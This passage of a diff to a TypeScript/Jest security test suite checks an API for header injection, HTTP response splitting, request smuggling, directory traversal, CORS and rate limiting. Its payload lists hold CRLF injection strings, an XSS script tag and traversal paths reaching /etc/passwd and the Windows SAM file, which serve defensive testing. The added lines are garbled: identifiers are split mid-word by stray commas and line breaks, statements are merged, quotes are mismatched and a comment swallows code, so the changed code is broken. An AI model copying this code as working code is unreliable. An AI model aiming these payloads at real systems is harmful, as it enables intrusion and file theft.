+        .post('/api/resources').set('Authorization', 'Bearer admin-token')
         .send(oversizedData);
-
       expect([200, 400, 413]).toContain(response.status);
 
       securityLogger.info(
@@ -912,23 +812,10 @@ describe('Controller Security Integration Tests', () => {
     });
   });
 
-  describe('Security Headers and CORS', () => {
-    it('should include all required security headers', async () => {
-      const testId = `${operationId}_security_headers`;
-      securityLogger.info(`[${testId}] Testing security headers inclusion`);
+    describe('Security Headers and CORS', () => {it('should include all required security headers', async () => {
+      const testId = `${operationId}_security_headers`;securityLogger.info(`[${testId}] Testing security headers inclusion`);
 
-      const response = await createRequest(app).get('/public/data').expect(200);
-
-      const requiredHeaders = {
-        'x-content-type-options': 'nosniff',
-        'x-frame-options': 'DENY',
-        'x-xss-protection': '1; mode=block',
-        'strict-transport-security': 'max-age=31536000; includeSubDomains',
-        'content-security-policy': "default-src 'self'",
-        'referrer-policy': 'strict-origin-when-cross-origin',
-      };
-
-      for (const [header, expectedValue] of Object.entries(requiredHeaders)) {
+      const response = await createRequest(app).get('/public/data').expect(200);const requiredHeaders = {'x-content-type-options': 'nosniff','x-frame-options': 'DENY','x-xss-protection': '1; mode=block','strict-transport-security': 'max-age=31536000; includeSubDomains','content-security-policy': "default-src 'self'','referrer-policy': 'strict-origin-when-cross-origin',};for (const [header, expectedValue] of Object.entries(requiredHeaders)) {
         expect(response.headers[header]).toContain(expectedValue.split(';')[0]);
       }
 
@@ -936,24 +823,14 @@ describe('Controller Security Integration Tests', () => {
     });
 
     it('should handle CORS preflight requests securely', async () => {
-      const testId = `${operationId}_cors_security`;
-      securityLogger.info(`[${testId}] Testing CORS preflight security`);
+      const testId = `${operationId}_cors_security`;securityLogger.info(`[${testId}] Testing CORS preflight security`);
 
       // Test preflight from allowed origin
       const allowedOriginResponse = await createRequest(app)
-        .options('/api/resources')
-        .set('Origin', 'https://trusted-domain.com')
-        .set('Access-Control-Request-Method', 'POST')
-        .set('Access-Control-Request-Headers', 'Authorization,Content-Type');
-
-      expect([200, 204, 404]).toContain(allowedOriginResponse.status);
-
-      // Test preflight from malicious origin
+        .options('/api/resources').set('Origin', 'https://trusted-domain.com').set('Access-Control-Request-Method', 'POST').set('Access-Control-Request-Headers', 'Authorization,Content-Type');
+      expect([200, 204, 404]).toContain(allowedOriginResponse.status);// Test preflight from malicious origin
       const maliciousOriginResponse = await createRequest(app)
-        .options('/api/resources')
-        .set('Origin', 'https://malicious-site.com')
-        .set('Access-Control-Request-Method', 'POST')
-        .set('Access-Control-Request-Headers', 'Authorization,Content-Type');
+        .options('/api/resources').set('Origin', 'https://malicious-site.com').set('Access-Control-Request-Method', 'POST').set('Access-Control-Request-Headers', 'Authorization,Content-Type');
 
       // Should handle malicious origins appropriately
       expect(maliciousOriginResponse.status).toBeLessThan(500);
@@ -964,10 +841,8 @@ describe('Controller Security Integration Tests', () => {
     });
   });
 
-  describe('Rate Limiting and DoS Protection', () => {
-    it('should enforce rate limits on API endpoints', async () => {
-      const testId = `${operationId}_rate_limiting`;
-      securityLogger.info(`[${testId}] Testing API endpoint rate limiting`);
+    describe('Rate Limiting and DoS Protection', () => {it('should enforce rate limits on API endpoints', async () => {
+      const testId = `${operationId}_rate_limiting`;securityLogger.info(`[${testId}] Testing API endpoint rate limiting`);
 
       // Make requests up to the limit
       const requests = Array(105)
@@ -975,8 +850,7 @@ describe('Controller Security Integration Tests', () => {
         .map(
           (_, _index) =>
             createRequest(app)
-              .get('/public/data')
-              .set('X-Forwarded-For', '192.168.1.100'), // Simulate same IP
+              .get('/public/data').set('X-Forwarded-For', '192.168.1.100'), // Simulate same IP
         );
 
       const responses = await Promise.all(requests);
@@ -993,8 +867,7 @@ describe('Controller Security Integration Tests', () => {
     });
 
     it('should handle burst traffic gracefully', async () => {
-      const testId = `${operationId}_burst_traffic`;
-      securityLogger.info(`[${testId}] Testing burst traffic handling`);
+      const testId = `${operationId}_burst_traffic`;securityLogger.info(`[${testId}] Testing burst traffic handling`);
 
       const startTime = Date.now();
 
@@ -1004,11 +877,7 @@ describe('Controller Security Integration Tests', () => {
         .map(
           (_, _index) =>
             createRequest(app)
-              .get('/public/data')
-              .set('X-Forwarded-For', `192.168.1.${200 + _index}`), // Different IPs
-        );
-
-      const responses = await Promise.all(promises);
+              .get('/public/data').set('X-Forwarded-For', `192.168.1.${200 + _index}`), // Different IPs);const responses = await Promise.all(promises);
       const processingTime = Date.now() - startTime;
 
       // All requests should complete (success or rate limited)
@@ -1026,21 +895,22 @@ describe('Controller Security Integration Tests', () => {
     });
 
     it('should protect against slowloris attacks', async () => {
-      const testId = `${operationId}_slowloris_protection`;
-      securityLogger.info(`[${testId}] Testing slowloris attack protection`);
+      const testId = `${operationId}_slowloris_protection`;securityLogger.info(`[${testId}] Testing slowloris attack protection`);
 
       // Simulate slow requests (timeout protection)
       const slowPromises = Array(5)
         .fill(null)
         .map(() => {
-          return new Promise<{ error: boolean; status?: number }>((resolve) => {
+          return new Promise<{ erro,
+      r: boolean; status?: number }>((resolve) => {
             const _req = createRequest(app)
-              .post('/api/resources')
-              .set('Authorization', 'Bearer admin-token')
-              .send({ name: 'Slow Request' })
+              .post('/api/resources').set('Authorization', 'Bearer admin-token').send({ nam,
+      e: 'Slow Request' })
               .timeout(5000) // 5 second timeout
               .end((err, res) => {
-                resolve({ error: !!err, status: res?.status });
+                resolve({ erro,
+        r: !!err, statu,
+      s: res?.status });
               });
           });
         });
@@ -1057,53 +927,40 @@ describe('Controller Security Integration Tests', () => {
     });
   });
 
-  describe('Attack Vector Testing', () => {
-    it('should prevent header injection attacks', async () => {
-      const testId = `${operationId}_header_injection`;
-      securityLogger.info(
-        `[${testId}] Testing header injection attack prevention`,
+    describe('Attack Vector Testing', () => {it('should prevent header injection attacks', async () => {
+      const testId = `${operationId}_header_injection`;securityLogger.info(`[${testId}] Testing header injection attack prevention`,
       );
 
       const maliciousHeaders = {
         Authorization: 'Bearer admin-token\r\nX-Injected: malicious-value',
-        'X-Custom-Header': 'value\r\nSet-Cookie: evil=true',
-        'User-Agent': 'Normal-Agent\r\nX-Evil-Header: injected',
+        'X-Custom-Header': 'value\r\nSet-Cooki,
+        e: evil=true',
+        'User-Agent': 'Normal-Agent\r\nX-Evil-Heade,
+      r: injected',
       };
 
       const _response = await createRequest(app)
-        .get('/api/protected')
-        .set(maliciousHeaders)
-        .expect((res) => {
+        .get('/api/protected').set(maliciousHeaders).expect((res) => {
           // Should not crash and should not contain injected headers
           expect(res.status).toBeLessThan(500);
-          expect(res.headers['x-injected']).toBeUndefined();
-          expect(res.headers['x-evil-header']).toBeUndefined();
+      expect(res.headers['x-injected']).toBeUndefined();
+      expect(res.headers['x-evil-header']).toBeUndefined();
         });
 
       securityLogger.info(`[${testId}] Header injection attempts blocked`);
     });
 
     it('should prevent HTTP response splitting', async () => {
-      const testId = `${operationId}_response_splitting`;
-      securityLogger.info(
-        `[${testId}] Testing HTTP response splitting prevention`,
+      const testId = `${operationId}_response_splitting`;securityLogger.info(`[${testId}] Testing HTTP response splitting prevention`,
       );
 
       const splittingPayloads = [
-        'search\r\nSet-Cookie: evil=true',
-        'query\r\n\r\n<script>alert("XSS")</script>',
-        'param\rContent-Length: 0\r\n\r\nHTTP/1.1 200 OK\r\n',
-      ];
-
-      for (const _payload of splittingPayloads) {
+        'search\r\nSet-Cookie: evil=true','query\r\n\r\n<script>alert("XSS")</script>",'param\rContent-Length: 0\r\n\r\nHTTP/1.1 200 OK\r\n',];for (const _payload of splittingPayloads) {
         const _response = await createRequest(app)
-          .get('/api/users/search')
-          .query({ q: _payload })
-          .set('Authorization', 'Bearer operator-token')
-          .expect((res) => {
-            // Should not split response or inject headers
+          .get('/api/users/search').query({,
+        q: _payload }).set('Authorization', 'Bearer operator-token').expect((res) => {// Should not split response or inject headers
             expect(res.status).toBeLessThan(500);
-            expect(res.headers['set-cookie']).toBeUndefined();
+      expect(res.headers['set-cookie']).toBeUndefined();
           });
       }
 
@@ -1113,16 +970,13 @@ describe('Controller Security Integration Tests', () => {
     });
 
     it('should handle request smuggling attempts', async () => {
-      const testId = `${operationId}_request_smuggling`;
-      securityLogger.info(`[${testId}] Testing request smuggling prevention`);
+      const testId = `${operationId}_request_smuggling`;securityLogger.info(`[${testId}] Testing request smuggling prevention`);
 
       // Attempt request smuggling with conflicting headers
       const _response = await createRequest(app)
-        .post('/api/resources')
-        .set('Authorization', 'Bearer admin-token')
-        .set('Content-Length', '100')
-        .set('Transfer-Encoding', 'chunked')
-        .send({ name: 'Smuggled Request', type: 'attack' })
+        .post('/api/resources').set('Authorization', 'Bearer admin-token').set('Content-Length', '100').set('Transfer-Encoding', 'chunked').send({ nam,
+        e: 'Smuggled Request', typ,
+      e: 'attack' })
         .expect((res) => {
           // Should handle gracefully without processing smuggled content
           expect([200, 400, 411].includes(res.status)).toBe(true);
@@ -1132,17 +986,11 @@ describe('Controller Security Integration Tests', () => {
     });
 
     it('should prevent directory traversal attacks', async () => {
-      const testId = `${operationId}_directory_traversal`;
-      securityLogger.info(
-        `[${testId}] Testing directory traversal attack prevention`,
+      const testId = `${operationId}_directory_traversal`;securityLogger.info(`[${testId}] Testing directory traversal attack prevention`,
       );
 
       const traversalPayloads = [
-        '../../../etc/passwd',
-        '..\\..\\..\\windows\\system32\\config\\sam',
-        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
-        '....//....//....//etc/passwd',
-        '/var/log/../../../etc/passwd',
+        '../../../etc/passwd','..\\..\\..\\windows\\system32\\config\\sam','%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd','....//....//....//etc/passwd','/var/log/../../../etc/passwd',
       ];
 
       for (const _payload of traversalPayloads) {
@@ -1159,34 +1007,23 @@ describe('Controller Security Integration Tests', () => {
     });
   });
 
-  describe('Security Monitoring and Logging', () => {
-    it('should log security events appropriately', async () => {
-      const testId = `${operationId}_security_logging`;
-      securityLogger.info(`[${testId}] Testing security event logging`);
+    describe('Security Monitoring and Logging', () => {it('should log security events appropriately', async () => {
+      const testId = `${operationId}_security_logging`;securityLogger.info(`[${testId}] Testing security event logging`);
 
       // Mock console to capture security logs
       const originalConsole = { ...console };
       const securityLogs: string[] = [];
 
       console.warn = (...args) => {
-        securityLogs.push(args.join(' '));
-        originalConsole.warn(...args);
-      };
+        securityLogs.push(args.join(' '));originalConsole.warn(...args);};
 
       console.error = (...args) => {
-        securityLogs.push(args.join(' '));
-        originalConsole.error(...args);
-      };
+        securityLogs.push(args.join(' '));originalConsole.error(...args);};
 
       // Generate security events
       await createRequest(app)
-        .get('/api/admin')
-        .set('Authorization', 'Bearer malicious-token')
-        .expect(401);
-
-      await createRequest(app)
-        .get('/api/admin')
-        .set('Authorization', 'Bearer viewer-token')
+        .get('/api/admin').set('Authorization', 'Bearer malicious-token').expect(401);await createRequest(app)
+        .get('/api/admin').set('Authorization', 'Bearer viewer-token')
         .expect(403);
 
       // Restore console
@@ -1202,26 +1039,23 @@ describe('Controller Security Integration Tests', () => {
     });
 
     it('should maintain audit trail for sensitive operations', async () => {
-      const testId = `${operationId}_audit_trail`;
-      securityLogger.info(
-        `[${testId}] Testing audit trail for sensitive operations`,
+      const testId = `${operationId}_audit_trail`;securityLogger.info(`[${testId}] Testing audit trail for sensitive operations`,
       );
 
       // Perform sensitive operations
       const sensitiveOperations = [
-        { method: 'get', path: '/api/admin', token: 'admin-token' },
-        {
-          method: 'post',
-          path: '/api/resources',
-          token: 'operator-token',
-          body: { name: 'Audit Test' },
-        },
-        {
+        { method: 'get', pat,
+        h: '/api/admin', toke,
+      n: 'admin-token' },{method: 'post',
+      path: '/api/resources',
+        token: 'operator-token',
+      bod,
+        y: { nam,
+      e: 'Audit Test' },},{
           method: 'delete',
-          path: '/api/resources/test-123',
-          token: 'admin-token',
-        },
-      ];
+      pat,
+        h: '/api/resources/test-123',toke,
+      n: 'admin-token',},];
 
       for (const operation of sensitiveOperations) {
         const requestObj = createRequest(app);
@@ -1229,29 +1063,22 @@ describe('Controller Security Integration Tests', () => {
         // Handle different HTTP methods with proper typing
         let baseRequest;
         switch (operation.method) {
-          case 'get':
-            baseRequest = requestObj.get(operation.path);
-            break;
-          case 'post':
-            baseRequest = requestObj.post(operation.path);
-            break;
-          case 'delete':
-            baseRequest = requestObj.delete(operation.path);
-            break;
-          default:
+          case 'get':baseRequest = requestObj.get(operation.path);break;
+          case 'post':baseRequest = requestObj.post(operation.path);break;
+          case 'delete':baseRequest = requestObj.delete(operation.path);break;
+          defaul,
+      t:
             baseRequest = requestObj.get(operation.path);
         }
 
         let reqWithAuth = baseRequest.set(
           'Authorization',
-          `Bearer ${operation.token}`,
-        );
-
-        if (operation.body) {
+          `Bearer ${operation.token}`,);if (operation.body) {
           reqWithAuth = reqWithAuth.send(operation.body);
         }
 
-        const response = await reqWithAuth.expect((res: { status: number }) => {
+        const response = await reqWithAuth.expect((res: { statu,
+      s: number }) => {
           expect([200, 201, 204].includes(res.status)).toBe(true);
         });
 
@@ -1266,11 +1093,8 @@ describe('Controller Security Integration Tests', () => {
     });
   });
 
-  describe('Performance Under Security Load', () => {
-    it('should maintain performance during security validation', async () => {
-      const testId = `${operationId}_security_performance`;
-      securityLogger.info(
-        `[${testId}] Testing performance under security validation load`,
+    describe('Performance Under Security Load', () => {it('should maintain performance during security validation', async () => {
+      const testId = `${operationId}_security_performance`;securityLogger.info(`[${testId}] Testing performance under security validation load`,
       );
 
       const startTime = Date.now();
@@ -1280,12 +1104,7 @@ describe('Controller Security Integration Tests', () => {
         .fill(null)
         .map((_, _index) =>
           createRequest(app)
-            .get('/api/protected')
-            .set('Authorization', 'Bearer admin-token')
-            .set('X-Request-ID', `perf-test-${_index}`),
-        );
-
-      const responses = await Promise.all(promises);
+            .get('/api/protected').set('Authorization', 'Bearer admin-token').set('X-Request-ID', `perf-test-${_index}`),);const responses = await Promise.all(promises);
       const processingTime = Date.now() - startTime;
 
       // All should succeed
@@ -1303,9 +1122,7 @@ describe('Controller Security Integration Tests', () => {
     });
 
     it('should handle mixed attack and legitimate traffic', async () => {
-      const testId = `${operationId}_mixed_traffic`;
-      securityLogger.info(
-        `[${testId}] Testing mixed attack and legitimate traffic handling`,
+      const testId = `${operationId}_mixed_traffic`;securityLogger.info(`[${testId}] Testing mixed attack and legitimate traffic handling`,
       );
 
       const startTime = Date.now();
@@ -1317,17 +1134,12 @@ describe('Controller Security Integration Tests', () => {
           .fill(null)
           .map(() =>
             createRequest(app)
-              .get('/api/protected')
-              .set('Authorization', 'Bearer admin-token'),
-          ),
-
-        // Attack requests
+              .get('/api/protected').set('Authorization', 'Bearer admin-token'),),// Attack requests
         ...Array(30)
           .fill(null)
           .map(() =>
             createRequest(app)
-              .get('/api/admin')
-              .set('Authorization', 'Bearer invalid-token'),
+              .get('/api/admin').set('Authorization', 'Bearer invalid-token'),
           ),
       ];
 
